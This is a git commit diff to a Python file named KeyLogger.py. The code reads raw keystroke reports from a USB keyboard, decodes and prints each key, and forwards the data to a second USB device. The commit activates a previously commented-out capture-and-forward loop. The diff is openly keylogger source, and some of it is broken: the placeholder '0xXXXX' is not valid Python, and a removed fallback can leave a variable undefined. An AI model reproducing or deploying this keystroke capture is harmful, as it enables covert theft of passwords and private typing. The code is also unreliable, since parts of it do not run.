0aeb15e4e7ee61de3677c8ae6e881bb72d832c3d
Alexander <alexandermis@web.de>
2023-05-12 11:40:32 +0200

    FileHandler

--- src/KeyLogger.py
+++ src/KeyLogger.py
@@ -77,13 +77,12 @@ class KeyLogger:
                         char = chr(key_code + 19)
                     elif key_code == 39:
                         char = chr(39 + 9)
-                    else:
-                        char = "NOT FOUND"
                     print(f"Key pressed: {key_code} ({char})")
+
                     # Forward data to another USB port
                     # You will need to change the vendor and product IDs below
-                    id_vendor = 0x00000
-                    device_id = 0x00000
+                    id_vendor = 0xXXXX
+                    device_id = 0xXXXX
                     device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
                     if device:
                         endpoint = device[0][(0,0)][0]
@@ -92,29 +91,47 @@ class KeyLogger:
                 if e.errno == 110:  # Timeout error
                     pass
     # TODO: Rewrite this code
-    # def run(self):
-    #     import hid
-    #     # #Mini Keyboard
-    #     id_vendor = 0x1c4f
-    #     device_id = 0x008b
-    #     # #RGB Broken Keyboard
-    #     # id_vendor = 0x046d
-    #     # device_id = 0xc33e
-    #     keyboard = hid.device()
-    #     keyboard.open(id_vendor,device_id)  # Change the vendor and product IDs to match your keyboard
-    #
-    #     # Read and process HID reports
-    #     while True:
-    #         data = keyboard.read(8)  # Read an 8-byte HID report
-    #         if data:
-    #             key_code = data[2]  # The key code is in byte 2
-    #             if key_code<30:
-    #                 char = chr(key_code+93)  # Convert the key code to a character
-    #             elif 30 <=key_code and key_code <49:
-    #                 char = chr(key_code + 19)
-    #             elif key_code == 39:
-    #                 char = chr(39+9)
-    #             print(f"Key pressed: {key_code} ({char})")
+    def run(self):
+        import hid
+        # #Mini Keyboard
+        id_vendor = 0x1c4f
+        device_id = 0x008b
+        # #RGB Broken Keyboard
+        # id_vendor = 0x046d
+        # device_id = 0xc33e
+        keyboard = hid.device()
+        keyboard.open(id_vendor,device_id)  # Change the vendor and product IDs to match your keyboard
+
+        # Read and process HID reports
+        while True:
+            data = keyboard.read(8)  # Read an 8-byte HID report
+            if data:
+                key_code = data[2]  # The key code is in byte 2
+                if key_code<30:
+                    char = chr(key_code+93)  # Convert the key code to a character
+                elif 30 <=key_code and key_code <49:
+                    char = chr(key_code + 19)
+                elif key_code == 39:
+                    char = chr(39+9)
+                print(f"Key pressed: {key_code} ({char})")
+                try:
+                    id_vendor = 0x00000
+                    device_id = 0x00000
+                    device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
+                    if device:
+                        endpoint = device[0][(0, 0)][0]
+                        device.write(endpoint, data, timeout=1000)
+                except Exception as e:
+                    logging.error(f'{e}')
+
+
+
+
+
+
+
+
+
 
 
 
